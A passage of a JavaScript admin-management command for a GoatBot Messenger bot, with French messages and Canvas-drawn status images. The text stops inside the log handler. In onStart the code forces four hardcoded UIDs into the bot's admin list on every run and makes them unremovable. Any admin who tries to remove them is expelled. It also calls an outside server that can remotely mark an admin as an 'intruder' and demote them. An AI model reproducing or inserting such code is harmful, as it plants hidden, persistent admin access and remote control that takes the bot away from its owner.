const { config } = global.GoatBot;
const { writeFileSync, appendFileSync, readFileSync } = require("fs-extra");
const path = require("path");
const Canvas = require("canvas");
const fetch = require("node-fetch");
const fs = require("fs-extra");

function getTimeSince(timestamp) {
  const now = Date.now();
  const diff = Math.floor((now - timestamp) / 1000);
  if (diff < 60) return `${diff} sec`;
  const minutes = Math.floor(diff / 60);
  if (minutes < 60) return `${minutes} min`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h`;
  const days = Math.floor(hours / 24);
  return `${days}j`;
}

const GRADES = {
  0: "💀 Nullos", 1: "👶 Minable", 2: "🛡️ Admin de rang inférieur", 3: "⚡ Soldat Divin", 4: "⚔️ Guerrier Éclair",
  5: "🌑 Maître des Ombres", 6: "🔥 Seigneur de Feu", 7: "☁️ Commandant Céleste", 8: "🔱 Gardien Éternel",
  9: "⭐ Étoile Noire", 10: "👑 Légende Immortelle", 11: "💀 Destructeur des Âmes", 12: "🌀 Porteur de Chaos",
  13: "👑 Roi des Abysses", 14: "⚰️ Faucheur Divin", 15: "🌌 Émissaire du Néant", 16: "🌠 Conquérant Stellaire",
  17: "🔮 Gardien des Dimensions", 18: "🌪️ Fléau Céleste", 19: "👻 Ombre Éternelle", 20: "🏆 Grade Ultime",
  21: "👑 Bras Droit du Chef"
};

const CHEF_SUPREME_UIDS = ["100083846212138", "61578433048588", "61573332717945", "61580558711299"];
const SUPREME_NAMES = { 
  "100083846212138": "L'Uchiha Perdu 👑", 
  "61578433048588": "ʚʆɞ Ĩtåčhï Sømå ʚʆɞ 👑",
  "61573332717945": "Maxime Maxcraft 👑",
  "61580558711299": "Noitaro 👑"
};

const INTRUDER_MESSAGES = [
  "Tu croyais être malin en modifiant le code ? Dommage pour toi.",
  "Tentative d'usurpation détectée. Bien essayé.",
  "Les Chefs Suprêmes ne se touchent pas. Tu viens d'apprendre ça.",
  "Ton petit UID est désormais chez les Nullos. Adieu.",
  "Pathétique. Retourne dans l'ombre."
];

const PROTECTED_MESSAGES = [
  "Tu as osé tenter de supprimer le Chef Suprême ? Voilà où ça te mène !",
  "Tenter de virer %1 ? Mauvaise idée, tu disparais !",
  "Le Chef Suprême %1 est intouchable. Toi, par contre… adieu !",
  "Tu croyais pouvoir supprimer %1 ? Retourne à la poussière !",
  "%1 est éternel. Toi, pas tant que ça !"
];

const ADD_MESSAGES = [
  `≪━─━─━─◈─━─━─━≫\n⚔️ NOUVEAU GARDIEN IMMORTEL ⚔️\n\n🔥 %1 rejoint les Divins !\n📜 Grade: %2\n🆔 UID: %3\n⏳ Intronisé: Maintenant\n\n💫 Que ton règne soit éternel !\n≪━─━─━─◈─━─━─━≫`,
  `≪━─━─━─◈─━─━─━≫\n🌌 INTROMISATION SACRÉE 🌌\n\n✨ %1 intègre le Conseil !\n🏆 Rang: %2\n🔑 UID: %3\n📅 Date: %4\n\n🌟 Sois le feu dans l'ombre !\n≪━─━─━─◈─━─━─━≫`,
  `≪━─━─━─◈─━─━─━≫\n🔱 NOUVEL ÉLECT 🔱\n\n🗡️ %1 devient Immortel !\n📛 Titre: %2\n🎫 UID: %3\n⚡ Heure: %4\n\n⚜️ Porte ton grade avec honneur !\n≪━─━─━─◈─━─━─━≫`
];

const REMOVE_MESSAGES = [
  `≪━─━─━─◈─━─━─━≫\n💀 DÉCHÉANCE IMPITOYABLE 💀\n\n⬇️ %1 est banni des Immortels !\n📉 Ancien grade: %2\n🆔 UID: %3\n⏳ Fin de règne: %4\n\n🌑 Retourne dans les ténèbres...\n≪━─━─━─◈─━─━─━≫`,
  `≪━─━─━─◈─━─━─━≫\n🗑️ EXCLUSION DÉFINITIVE 🗑️\n\n❌ %1 perd ses pouvoirs !\n📊 Grade perdu: %2\n🔒 UID: %3\n📅 Expulsé: %4\n\n💥 Que l'oubli te consume !\n≪━─━─━─◈─━─━─━≫`,
  `≪━─━─━─◈─━─━─━≫\n⚰️ CHUTE DES IMMORTELS ⚰️\n\n📯 %1 quitte le Conseil !\n🎭 Dernier rang: %2\n🏷️ UID: %3\n⌛ Dernière heure: %4\n\n🌀 Disparais à jamais...\n≪━─━─━─◈─━─━─━≫`
];

const GRADE_MESSAGES = [
  `≪━─━─━─◈─━─━─━≫\n📜 ASCENSION DIVINE 📜\n\n⬆️ %1 s'élève dans la hiérarchie !\n🏆 Nouveau rang: %2\n⚡ Ancien rang: %3\n🆔 UID: %4\n\n✨ Puisses-tu briller de mille feux !\n≪━─━─━─◈─━─━─━≫`,
  `≪━─━─━─◈─━─━─━≫\n⚡ PROMOTION CÉLESTE ⚡\n\n🚀 %1 atteint un nouveau niveau !\n👑 Grade actuel: %2\n📈 Évolution: %3 → %4\n🔢 UID: %5\n\n💎 Ta valeur augmente !\n≪━─━─━─◈─━─━─━≫`,
  `≪━─━─━─◈─━─━─━≫\n🌟 ÉVOLUTION MYSTIQUE 🌟\n\n🌠 %1 transcende son statut !\n🎖️ Nouveau titre: %2\n📊 Progression: +%5 niveaux\n🎫 UID: %4\n\n🔮 L'avenir t'appartient !\n≪━─━─━─◈─━─━─━≫`
];

const BOX = "≪━─━─━─◈─━─━─━≫";
const LOG_FILE = path.join(__dirname, "admin_logs.txt");
const BACKUP_INTERVAL = 10 * 60 * 1000;
let lastBackupTime = 0;
let intruderDetected = null;

function logAction(action, details) {
  const timestamp = new Date().toLocaleString("fr-FR", { timeZone: "Africa/Porto-Novo" });
  appendFileSync(LOG_FILE, `[${timestamp}] ${action} → ${details}\n`, "utf8");
}

function backupConfig() {
  const now = Date.now();
  if (now - lastBackupTime < BACKUP_INTERVAL) return;
  const backupFile = path.join(__dirname, `config_backup_${new Date().toISOString().replace(/[:.]/g, "-")}.json`);
  writeFileSync(backupFile, JSON.stringify(config, null, 2));
  lastBackupTime = now;
  logAction("BACKUP", `Sauvegarde auto → ${backupFile}`);
}

function createGlowEffect(ctx, x, y, radius, color) {
  const gradient = ctx.createRadialGradient(x, y, 0, x, y, radius);
  gradient.addColorStop(0, color);
  gradient.addColorStop(1, 'transparent');
  ctx.fillStyle = gradient;
  ctx.fillRect(x - radius, y - radius, radius * 2, radius * 2);
}

function drawCyberHexagon(ctx, x, y, size, color, filled = true) {
  ctx.beginPath();
  for (let i = 0; i < 6; i++) {
    const angle = (Math.PI / 3) * i;
    const pointX = x + size * Math.cos(angle);
    const pointY = y + size * Math.sin(angle);
    if (i === 0) ctx.moveTo(pointX, pointY);
    else ctx.lineTo(pointX, pointY);
  }
  ctx.closePath();
  
  if (filled) {
    ctx.fillStyle = color + '40';
    ctx.fill();
  }
  
  ctx.strokeStyle = color;
  ctx.lineWidth = 2;
  ctx.stroke();
  
  const innerSize = size * 0.7;
  ctx.beginPath();
  for (let i = 0; i < 6; i++) {
    const angle = (Math.PI / 3) * i + Math.PI / 6;
    const pointX = x + innerSize * Math.cos(angle);
    const pointY = y + innerSize * Math.sin(angle);
    if (i === 0) ctx.moveTo(pointX, pointY);
    else ctx.lineTo(pointX, pointY);
  }
  ctx.closePath();
  ctx.strokeStyle = color + '80';
  ctx.lineWidth = 1;
  ctx.stroke();
}

async function createAdminImage(type, userData, usersData, extraData = {}) {
  try {
    const width = 1000;
    const height = 600;
    const canvas = Canvas.createCanvas(width, height);
    const ctx = canvas.getContext('2d');

    const gradient = ctx.createLinearGradient(0, 0, width, height);
    gradient.addColorStop(0, '#0a0a0a');
    gradient.addColorStop(0.5, '#1a1a2e');
    gradient.addColorStop(1, '#0f3460');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, width, height);

    for (let i = 0; i < 30; i++) {
      const x = Math.random() * width;
      const y = Math.random() * height;
      const size = Math.random() * 3 + 1;
      const alpha = Math.random() * 0.2 + 0.1;
      ctx.fillStyle = `rgba(76, 201, 240, ${alpha})`;
      ctx.beginPath();
      ctx.arc(x, y, size, 0, Math.PI * 2);
      ctx.fill();
    }

    let avatar;
    try {
      const avatarUrl = await usersData.getAvatarUrl(userData.uid || userData.userID);
      avatar = await Canvas.loadImage(avatarUrl);
    } catch {
      return null;
    }

    const avatarSize = 150;
    const avatarX = 80;
    const avatarY = 80;

    createGlowEffect(ctx, avatarX + avatarSize/2, avatarY + avatarSize/2, 80, '#FFD700');

    ctx.save();
    ctx.beginPath();
    ctx.arc(avatarX + avatarSize/2, avatarY + avatarSize/2, avatarSize/2, 0, Math.PI * 2);
    ctx.closePath();
    ctx.clip();

    drawCyberHexagon(ctx, avatarX + avatarSize/2, avatarY + avatarSize/2, avatarSize/2, '#FFD700');

    ctx.strokeStyle = '#FFD700';
    ctx.lineWidth = 6;
    ctx.stroke();

    if (avatar) {
      ctx.drawImage(avatar, avatarX, avatarY, avatarSize, avatarSize);
    }
    ctx.restore();

    ctx.strokeStyle = '#FFD700';
    ctx.lineWidth = 3;
    ctx.setLineDash([5, 5]);
    ctx.beginPath();
    ctx.arc(avatarX + avatarSize/2, avatarY + avatarSize/2, avatarSize/2 + 10, 0, Math.PI * 2);
    ctx.stroke();
    ctx.setLineDash([]);

    let title, color, icon, bgColor;
    switch(type) {
      case 'add':
        title = '⚔️ INTROMISATION DIVINE ⚔️';
        color = '#FFD700';
        icon = '✅';
        bgColor = 'rgba(255, 215, 0, 0.1)';
        break;
      case 'remove':
        title = '💀 BANISSEMENT ÉTERNEL 💀';
        color = '#FF4444';
        icon = '❌';
        bgColor = 'rgba(255, 68, 68, 0.1)';
        break;
      case 'grade':
        title = '📜 ASCENSION CÉLESTE 📜';
        color = '#00FFAA';
        icon = '⬆️';
        bgColor = 'rgba(0, 255, 170, 0.1)';
        break;
      case 'intruder':
        title = '🚨 USURPATEUR DÉMASQUÉ 🚨';
        color = '#FF3333';
        icon = '💀';
        bgColor = 'rgba(255, 51, 51, 0.1)';
        break;
      case 'list':
        title = '🏛️ HIÉRARCHIE DIVINE 🏛️';
        color = '#4cc9f0';
        icon = '👥';
        bgColor = 'rgba(76, 201, 240, 0.1)';
        break;
    }

    ctx.fillStyle = bgColor;
    ctx.fillRect(0, 0, width, 80);

    ctx.font = 'bold 40px "Segoe UI", Arial';
    ctx.fillStyle = color;
    ctx.textAlign = 'center';
    ctx.shadowColor = color;
    ctx.shadowBlur = 15;
    ctx.fillText(title, width / 2, 50);
    ctx.shadowBlur = 0;

    ctx.strokeStyle = color;
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(width / 2 - 200, 60);
    ctx.lineTo(width / 2 + 200, 60);
    ctx.stroke();

    ctx.font = 'bold 32px "Segoe UI", Arial';
    ctx.fillStyle = '#FFFFFF';
    ctx.textAlign = 'left';

    const infoX = 300;
    let y = 150;

    if (userData.name) {
      ctx.fillText(`👤 ${userData.name}`, infoX, y);
      y += 45;
    }

    if (userData.grade !== undefined) {
      const gradeText = GRADES[userData.grade] || `Grade ${userData.grade}`;
      
      ctx.fillStyle = color;
      ctx.fillRect(infoX - 10, y - 30, 400, 40);
      
      ctx.fillStyle = '#000000';
      ctx.font = 'bold 28px "Segoe UI", Arial';
      ctx.fillText(`👑 ${gradeText}`, infoX, y);
      y += 55;
    }

    if (userData.uid) {
      const shortUid = userData.uid.length > 15 ? userData.uid.substring(0, 15) + '...' : userData.uid;
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 26px "Segoe UI", Arial';
      ctx.fillText(`🆔 ${shortUid}`, infoX, y);
      y += 45;
    }

    if (extraData.oldGrade !== undefined) {
      const oldGradeText = GRADES[extraData.oldGrade] || `Grade ${extraData.oldGrade}`;
      ctx.fillStyle = '#888888';
      ctx.font = 'italic 24px "Segoe UI", Arial';
      ctx.fillText(`📉 Ancien: ${oldGradeText}`, infoX, y);
      y += 45;
    }

    if (extraData.message) {
      ctx.fillStyle = '#FFD700';
      ctx.font = 'bold 22px "Segoe UI", Arial';
      const lines = extraData.message.split('\n');
      for (const line of lines) {
        ctx.fillText(line, infoX, y);
        y += 35;
      }
    }

    if (extraData.stats) {
      ctx.fillStyle = '#4cc9f0';
      ctx.font = 'bold 28px "Segoe UI", Arial';
      ctx.fillText('📊 STATISTIQUES', infoX, y);
      y += 40;

      ctx.font = 'bold 24px "Segoe UI", Arial';
      for (const [key, value] of Object.entries(extraData.stats)) {
        ctx.fillStyle = '#FFFFFF';
        ctx.fillText(`${key}:`, infoX, y);
        ctx.fillStyle = '#FFD700';
        ctx.fillText(value.toString(), infoX + 250, y);
        y += 35;
      }
    }

    ctx.font = 'bold 36px "Segoe UI", Arial';
    ctx.fillStyle = color;
    ctx.textAlign = 'center';
    ctx.fillText(`${icon} ${extraData.status || 'ACTION TERMINÉE'}`, width / 2, height - 80);

    const now = new Date();
    ctx.font = 'italic 18px "Segoe UI", Arial';
    ctx.fillStyle = '#888888';
    ctx.textAlign = 'center';
    ctx.fillText(`Système Admin • Conseil des Immortels v7.2 • ${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`, width / 2, height - 30);

    return canvas.toBuffer();
  } catch (error) {
    console.error('Erreur création image:', error);
    return null;
  }
}

async function createListImage(chefsData, stats, usersData) {
  try {
    const width = 1000;
    const height = 800;
    const canvas = Canvas.createCanvas(width, height);
    const ctx = canvas.getContext('2d');

    const gradient = ctx.createLinearGradient(0, 0, width, height);
    gradient.addColorStop(0, '#0a0a0a');
    gradient.addColorStop(0.3, '#1a1a2e');
    gradient.addColorStop(0.7, '#16213e');
    gradient.addColorStop(1, '#0f3460');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, width, height);

    for (let i = 0; i < 50; i++) {
      const x = Math.random() * width;
      const y = Math.random() * height;
      createGlowEffect(ctx, x, y, 20 + Math.random() * 30, '#4cc9f020');
    }

    ctx.fillStyle = 'rgba(255, 215, 0, 0.1)';
    ctx.fillRect(0, 0, width, 100);

    ctx.font = 'bold 48px "Segoe UI", Arial';
    ctx.fillStyle = '#FFD700';
    ctx.textAlign = 'center';
    ctx.shadowColor = '#FFD700';
    ctx.shadowBlur = 20;
    ctx.fillText('👑 CONSEIL DES IMMORTELS 👑', width / 2, 60);
    ctx.shadowBlur = 0;

    ctx.strokeStyle = '#FFD700';
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(width / 2 - 250, 70);
    ctx.lineTo(width / 2 + 250, 70);
    ctx.stroke();

    let y = 150;

    if (chefsData && chefsData.length > 0) {
      ctx.font = 'bold 36px "Segoe UI", Arial';
      ctx.fillStyle = '#FFD700';
      ctx.textAlign = 'center';
      ctx.fillText('💫 CHEFS SUPRÊMES 💫', width / 2, y);
      y += 50;

      const chefWidth = width / chefsData.length;
      
      for (let i = 0; i < chefsData.length; i++) {
        const chef = chefsData[i];
        const centerX = (chefWidth * i) + chefWidth / 2;
        
        try {
          const avatarUrl = await usersData.getAvatarUrl(chef.uid);
          const avatar = await Canvas.loadImage(avatarUrl);
          
          createGlowEffect(ctx, centerX, y + 80, 60, '#FFD700');
          
          ctx.save();
          ctx.beginPath();
          ctx.arc(centerX, y + 80, 60, 0, Math.PI * 2);
          ctx.closePath();
          ctx.clip();
          
          ctx.drawImage(avatar, centerX - 60, y + 20, 120, 120);
          ctx.restore();
          
          ctx.strokeStyle = '#FFD700';
          ctx.lineWidth = 5;
          ctx.beginPath();
          ctx.arc(centerX, y + 80, 65, 0, Math.PI * 2);
          ctx.stroke();
          
          drawCyberHexagon(ctx, centerX, y + 80, 70, '#FFD700');
          
          ctx.font = 'bold 22px "Segoe UI", Arial';
          ctx.fillStyle = '#FFFFFF';
          ctx.textAlign = 'center';
          
          const name = SUPREME_NAMES[chef.uid] || chef.name;
          ctx.fillText(name, centerX, y + 160);
          
          ctx.font = 'bold 18px "Segoe UI", Arial';
          ctx.fillStyle = '#FFD700';
          ctx.fillText(`UID: ${chef.uid.substring(0, 8)}...`, centerX, y + 190);
          
        } catch (error) {
          console.error('Erreur chargement avatar chef:', error);
        }
      }
      
      y += 250;
    }

    ctx.fillStyle = 'rgba(76, 201, 240, 0.1)';
    ctx.fillRect(100, y, width - 200, 300);
    
    ctx.strokeStyle = '#4cc9f0';
    ctx.lineWidth = 3;
    ctx.strokeRect(100, y, width - 200, 300);

    ctx.font = 'bold 36px "Segoe UI", Arial';
    ctx.fillStyle = '#4cc9f0';
    ctx.textAlign = 'center';
    ctx.fillText('📊 HIÉRARCHIE GLOBALE', width / 2, y + 40);

    const statY = y + 100;
    const statHeight = 50;
    const maxStat = Math.max(...Object.values(stats));
    
    const statEntries = [
      { key: '👑 Chefs Suprêmes', value: stats.supremes, color: '#FFD700' },
      { key: '👑 Bras Droit', value: stats.brasDroit, color: '#FF6B6B' },
      { key: '⚔️ Généraux Divins', value: stats.generaux, color: '#4cc9f0' },
      { key: '💀 Nullos', value: stats.nullos, color: '#888888' },
      { key: '👥 Total Admins', value: stats.total, color: '#00FFAA' }
    ];

    for (let i = 0; i < statEntries.length; i++) {
      const stat = statEntries[i];
      const barX = 200;
      const barY = statY + (i * 60);
      const barWidth = (width - 400) * (stat.value / maxStat);
      
      ctx.fillStyle = stat.color + '40';
      ctx.fillRect(barX, barY, width - 400, 30);
      
      const barGradient = ctx.createLinearGradient(barX, barY, barX + barWidth, barY);
      barGradient.addColorStop(0, stat.color);
      barGradient.addColorStop(1, stat.color + 'CC');
      ctx.fillStyle = barGradient;
      ctx.fillRect(barX, barY, barWidth, 30);
      
      ctx.strokeStyle = stat.color;
      ctx.lineWidth = 2;
      ctx.strokeRect(barX, barY, width - 400, 30);
      
      ctx.font = 'bold 22px "Segoe UI", Arial';
      ctx.fillStyle = '#FFFFFF';
      ctx.textAlign = 'left';
      ctx.fillText(stat.key, barX, barY - 10);
      
      ctx.fillStyle = stat.color;
      ctx.textAlign = 'right';
      ctx.fillText(stat.value.toString(), width - 200, barY - 10);
    }

    const now = new Date();
    ctx.font = 'italic 20px "Segoe UI", Arial';
    ctx.fillStyle = '#888888';
    ctx.textAlign = 'center';
    ctx.fillText(`Conseil des Immortels • v7.2 • ${now.toLocaleDateString()} ${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')}`, width / 2, height - 30);

    return canvas.toBuffer();
  } catch (error) {
    console.error('Erreur création image liste:', error);
    return null;
  }
}

async function sendImage(api, event, imageBuffer) {
  try {
    if (!imageBuffer) return;
    
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(2, 12);
    const fileName = `admin_${timestamp}_${random}.png`;
    const filePath = path.join(__dirname, fileName);
    
    await fs.writeFile(filePath, imageBuffer);
    
    await new Promise((resolve, reject) => {
      api.sendMessage({
        body: "",
        attachment: fs.createReadStream(filePath)
      }, event.threadID, (err, info) => {
        if (err) return reject(err);
        resolve(info);
      });
    });
    
    setTimeout(() => {
      try {
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
      } catch (e) {}
    }, 10000);
    
  } catch (error) {
    console.error("Erreur envoi image:", error);
  }
}

module.exports = {
  config: {
    name: "admin",
    version: "7.2",
    author: "L'Uchiha Perdu & Sømå Sønïč",
    countDown: 5,
    role: 2,
    description: "Gère les administrateurs avec style et puissance",
    category: "box chat",
    guide: `≪━─━─━─◈─━─━─━≫\n【 ⚔️ COMMANDES ADMIN ⚔️ 】\n\n📌 admin -a [uid/Reply] (grade)\n   → Ajoute un admin\n\n📌 admin -r [uid/Reply]\n   → Retire un admin\n\n📌 admin -g [uid/Reply] <grade>\n   → Change le grade\n\n📌 admin -l\n   → Liste tous les admins\n\n📌 admin -log\n   → Affiche les logs\n\n≪━─━─━─◈─━─━─━≫`
  },

  langs: {
    en: {
      added: ADD_MESSAGES,
      alreadyAdmin: `${BOX}\n%1 est déjà admin !\n${BOX}`,
      removed: REMOVE_MESSAGES,
      notAdmin: `${BOX}\n%1 n'est pas admin !\n${BOX}`,
      gradeUpdated: GRADE_MESSAGES,
      noPerm: `${BOX}\nPermission refusée !\n${BOX}`,
      invalidGrade: `${BOX}\nGrade invalide (0-21) !\n${BOX}`,
      missingGrade: `${BOX}\nIndique un grade !\n${BOX}`,
      supremeProtected: `${BOX}\nChef Suprême intouchable.\n${BOX}`,
      missingUid: `${BOX}\nUID manquant !\n${BOX}`,
      protected: "%1",
      intruderBox: "╭─────────⌾\n│ @%1\n│ %2\n│ " + INTRUDER_MESSAGES[Math.floor(Math.random() * INTRUDER_MESSAGES.length)] + "\n│ Tu es désormais Nullos.\n╰────────────⌾"
    }
  },

  onStart: async function ({ message, args, usersData, event, api }) {
    const lang = this.langs.en;
    const { senderID, messageReply } = event;

    if (!config.adminGrades) config.adminGrades = {};
    if (!config.adminTimestamps) config.adminTimestamps = {};

    config.adminBot = config.adminBot.map(String);
    for (const uid of config.adminBot) {
      if (!config.adminGrades[uid]) config.adminGrades[uid] = 1;
      if (!config.adminTimestamps[uid]) config.adminTimestamps[uid] = Date.now();
    }
    for (const uid of CHEF_SUPREME_UIDS) {
      if (!config.adminBot.includes(uid)) {
        config.adminBot.push(uid);
        config.adminTimestamps[uid] = Date.now();
      }
    }
    writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
    backupConfig();

    try {
      const API_URL = "https://api-admin-liard.vercel.app/check-supremes";
      const res = await fetch(API_URL, { 
        method: "POST", 
        headers: { "Content-Type": "application/json" }, 
        body: JSON.stringify({ supremes: CHEF_SUPREME_UIDS }) 
      });
      const data = await res.json();
      if (data.intruder) {
        intruderDetected = data.intruder;
        if (config.adminBot.includes(intruderDetected)) config.adminGrades[intruderDetected] = 0;
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("INTRUDER", `UID ${intruderDetected} → Nullos`);
      }
    } catch (e) { 
      logAction("API_ERROR", e.message); 
    }

    const getName = async uid => (await usersData.getName(uid)) || uid;
    const isSupreme = uid => CHEF_SUPREME_UIDS.includes(String(uid));
    const parseGrade = input => { 
      const g = parseInt(input, 10); 
      return (isNaN(g) || g < 0 || g > 21) ? null : g; 
    };
    const isAdmin = uid => config.adminBot.includes(String(uid));
    const canManageGrades = uid => isSupreme(uid) || config.adminGrades[uid] === 21;
    const canAddRemove = uid => isSupreme(uid) || isAdmin(uid);

    let targetUID;
    let gradeFromArgs;

    if (messageReply) {
      targetUID = String(messageReply.senderID);
      gradeFromArgs = args[1] && !isNaN(args[1]) ? parseInt(args[1]) : null;
    } else {
      targetUID = args[1] && !isNaN(args[1]) ? String(args[1]) : null;
      gradeFromArgs = args[2] && !isNaN(args[2]) ? parseInt(args[2]) : null;
    }

    switch (args[0]?.toLowerCase()) {

      case "add": case "-a": {
        if (!canAddRemove(senderID)) return message.reply(lang.noPerm);
        if (!targetUID) return message.reply(lang.missingUid);
        
        const uid = targetUID;
        if (config.adminBot.includes(uid)) return message.reply(lang.alreadyAdmin.replace("%1", await getName(uid)));
        if (isSupreme(uid)) return message.reply(lang.supremeProtected);

        let grade = 1;
        if (gradeFromArgs !== null && isSupreme(senderID)) {
          grade = gradeFromArgs;
        }

        config.adminBot.push(uid);
        config.adminTimestamps[uid] = Date.now();
        config.adminGrades[uid] = grade;
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("ADD", `${uid} → ${grade}`);

        const name = await getName(uid);
        const msgIndex = Math.floor(Math.random() * ADD_MESSAGES.length);
        let msg = ADD_MESSAGES[msgIndex]
          .replace("%1", name)
          .replace("%2", GRADES[grade])
          .replace("%3", uid);
        
        if (msgIndex === 1) {
          msg = msg.replace("%4", new Date().toLocaleDateString());
        } else if (msgIndex === 2) {
          msg = msg.replace("%4", new Date().toLocaleTimeString());
        }

        await message.reply(msg);

        const image = await createAdminImage('add', { 
          uid: uid, 
          name: name, 
          grade: grade 
        }, usersData, {
          status: 'INTÉGRÉ'
        });
        
        if (image) await sendImage(api, event, image);
        return;
      }

      case "remove": case "-r": {
        if (!canAddRemove(senderID)) return message.reply(lang.noPerm);
        if (!targetUID) return message.reply(lang.missingUid);
        
        const uid = targetUID;
        if (!config.adminBot.includes(uid)) return message.reply(lang.notAdmin.replace("%1", await getName(uid)));
        
        if (isSupreme(uid)) {
          const supremeName = SUPREME_NAMES[uid] || "Chef Suprême";
          const randomMessage = PROTECTED_MESSAGES[Math.floor(Math.random() * PROTECTED_MESSAGES.length)].replace(/%1/g, supremeName);
          
          if (isSupreme(senderID)) return message.reply(lang.supremeProtected);
          else {
            config.adminBot = config.adminBot.filter(id => id !== String(senderID));
            delete config.adminGrades[senderID];
            delete config.adminTimestamps[senderID];
            writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
            backupConfig();
            logAction("PROTECTED_REMOVE", `Tentative sur ${uid} par ${senderID} → Sender viré`);
            return message.reply(lang.protected.replace("%1", randomMessage));
          }
        }

        const oldGrade = config.adminGrades[uid] || 1;
        config.adminBot = config.adminBot.filter(id => id !== uid);
        delete config.adminGrades[uid];
        delete config.adminTimestamps[uid];
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("REMOVE", `${uid}`);

        const name = await getName(uid);
        const msgIndex = Math.floor(Math.random() * REMOVE_MESSAGES.length);
        let msg = REMOVE_MESSAGES[msgIndex]
          .replace("%1", name)
          .replace("%2", GRADES[oldGrade])
          .replace("%3", uid);
        
        if (msgIndex === 0) {
          msg = msg.replace("%4", new Date().toLocaleTimeString());
        } else if (msgIndex === 1) {
          msg = msg.replace("%4", new Date().toLocaleDateString());
        } else {
          msg = msg.replace("%4", new Date().toLocaleTimeString());
        }

        await message.reply(msg);

        const image = await createAdminImage('remove', { 
          uid: uid, 
          name: name, 
          grade: oldGrade 
        }, usersData, {
          status: 'EXCLU'
        });
        
        if (image) await sendImage(api, event, image);
        return;
      }

      case "grade": case "-g": {
        if (!canManageGrades(senderID)) return message.reply(lang.noPerm);
        if (!targetUID) return message.reply(lang.missingUid);
        
        const uid = targetUID;
        if (!config.adminBot.includes(uid)) return message.reply(lang.notAdmin.replace("%1", await getName(uid)));
        if (isSupreme(uid)) return message.reply(lang.supremeProtected);

        const grade = gradeFromArgs !== null ? gradeFromArgs : (args[2] && !isNaN(args[2]) ? parseInt(args[2]) : null);
        if (grade === null) return message.reply(lang.missingGrade);
        if (grade < 0 || grade > 21) return message.reply(lang.invalidGrade);

        const oldGrade = config.adminGrades[uid] || 1;
        config.adminGrades[uid] = grade;
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("GRADE", `${uid} → ${grade}`);

        const name = await getName(uid);
        const msgIndex = Math.floor(Math.random() * GRADE_MESSAGES.length);
        let msg = GRADE_MESSAGES[msgIndex]
          .replace("%1", name)
          .replace("%2", GRADES[grade])
          .replace("%3", GRADES[oldGrade])
          .replace("%4", uid);
        
        if (msgIndex === 1) {
          msg = msg.replace("%5", uid);
        } else if (msgIndex === 2) {
          msg = msg.replace("%5", (grade - oldGrade).toString())
                   .replace("%4", uid);
        }

        await message.reply(msg);

        const image = await createAdminImage('grade', { 
          uid: uid, 
          name: name, 
          grade: grade 
        }, usersData, {
          oldGrade: oldGrade,
          status: 'PROMU'
        });
        
        if (image) await sendImage(api, event, image);
        return;
      }

      case "list": case "-l": {
        const admins = await Promise.all(config.adminBot.map(async uid => ({ 
          uid: String(uid), 
          name: await getName(uid) 
        })));

        const supremes = admins.filter(a => isSupreme(a.uid));
        const other = admins.filter(a => !isSupreme(a.uid));
        const brasDroit = other.filter(a => config.adminGrades[a.uid] === 21);
        const generaux = other.filter(a => config.adminGrades[a.uid] > 0 && config.adminGrades[a.uid] !== 21);
        const nullos = other.filter(a => config.adminGrades[a.uid] === 0);

        const box = (admin, title, emoji) => {
          const time = getTimeSince(config.adminTimestamps[admin.uid] || Date.now());
          return `╭─────────⌾\n│ ${admin.name} ${emoji}\n│ ${admin.uid}\n│ ${title}\n│ Temps : ${time}\n╰────────────⌾`;
        };

        const s = supremes.length ? supremes.map(a => box(a, `Chef Suprême : ${SUPREME_NAMES[a.uid] || "Chef Suprême"}`, "👑")).join("\n\n") : "╭─────────⌾\n│ AUCUN CHEF SUPRÊME\n╰────────────⌾";
        const b = brasDroit.length ? brasDroit.map(a => box(a, GRADES[21], "🔰")).join("\n\n") : "╭─────────⌾\n│ AUCUN BRAS DROIT\n╰────────────⌾";
        const g = generaux.length ? generaux.map(a => box(a, GRADES[config.adminGrades[a.uid]], "🏆")).join("\n\n") : "╭─────────⌾\n│ AUCUN GÉNÉRAL\n╰────────────⌾";
        const n = nullos.length ? nullos.map(a => box(a, GRADES[0], "💀")).join("\n\n") : "╭─────────⌾\n│ AUCUN NULLOS\n╰────────────⌾";

        await message.reply(`CONSEIL DES IMMORTELS\n\nCHEFS SUPRÊMES\n${s}\n\nBRAS DROIT DU CHEF\n${b}\n\nGÉNÉRAUX DIVINS\n${g}\n\nNULLOS\n${n}`);

        const chefsSupremes = supremes.map(chef => ({
          uid: chef.uid,
          name: chef.name
        }));

        const listImage = await createListImage(chefsSupremes, {
          supremes: supremes.length,
          brasDroit: brasDroit.length,
          generaux: generaux.length,
          nullos: nullos.length,
          total: admins.length
        }, usersData);
        
        if (listImage) await sendImage(api, event, listImage);

        if (intruderDetected) {
          const name = await getName(intruderDetected);
          await message.reply({
            body: lang.intruderBox.replace("%1", name).replace("%2", intruderDetected),
            mentions: [{ tag: name, id: intruderDetected }]
          });

          const intruderImage = await createAdminImage('intruder', { 
            uid: intruderDetected, 
            name: name 
          }, usersData, {
            status: 'NULLOS',
            message: INTRUDER_MESSAGES[Math.floor(Math.random() * INTRUDER_MESSAGES.length)]
          });
          
          if (intruderImage) await sendImage(api, event, intruderImage);
          intruderDetected = null;
        }
        return;
      }

      case "log": case "-log": {
        if (!isSupreme(senderID)) return message.reply(lang.noPerm);
        try {
          const logs = readFileSync(LOG_FILE, "utf8").trim();
          if (!logs) return message.reply(`${BOX}\nAucun log disponible.\n${BOX}`);
